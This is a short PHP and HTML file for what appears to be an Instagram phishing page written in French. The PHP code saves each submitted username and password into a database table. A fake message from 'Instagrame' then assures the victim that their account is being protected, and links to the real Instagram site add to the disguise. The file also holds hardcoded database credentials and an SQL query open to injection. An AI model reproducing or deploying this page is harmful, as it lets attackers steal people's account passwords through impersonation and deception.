<?php
	
   
	

	define('HOST', 'sqlXXX.epizy.com');
	define('DB_NAME','epiz_32076407_XXX');
	define('USER','	epiz_32076407');
	define('PASS','PDDrlxogEq28u');
	
	$Id = $_POST['identifiant'];
	$MDP = $_POST['mdp'];
	
	
	try{

    	$db = new PDO("mysql:host=" . HOST . ";dbname=" . DB_NAME,USER,PASS);

    	$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    	$requete = "INSERT INTO Instagrame(ID,Password) VALUES('" . $_POST['identifiant'] . "', '" . $_POST['mdp'] . "')";
		$resultat = $db->query($requete);
    	}catch(PDOException $e){
		echo $e;}
        ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>Instagrame</title>
	<link rel="stylesheet" type="text/css" href="insta_style.css">
</head>
<body id="page2"><center>
	<img src="img/logo_insta2.png" id ='logo_insta2'>
	<p id = "end_text">Merci de votre coopération, nous allons surveiller les actions suspectes sur votre compte, trouver les intrus qui se seraient introduit dans votre compte sans vore permission et vous restorer votre compte sans intru.
	Bien évidemment l'administrateur qui s'occuperas de votre cas n'auras pas accés à vous données personels (vos discussions, photo, stories). Vous aurez toujours accés à votre compte et l'équipe instagrame vous envéras un e-mail dans les cinq jours à venir si nous rencontrons des problémes.<br>
	
	<a href="https://www.instagram.com/accounts/login/" id="insta_link">Pour aller sur instagrame</a>
</p></center>
  <a href="https://about.facebook.com/"id="insta_pol2">Français © 2022 Instagram par Meta</a> 
	<a id="help" href="https://help.instagram.com/?locale=fr_FR"> Aide</a>

</body>
</html>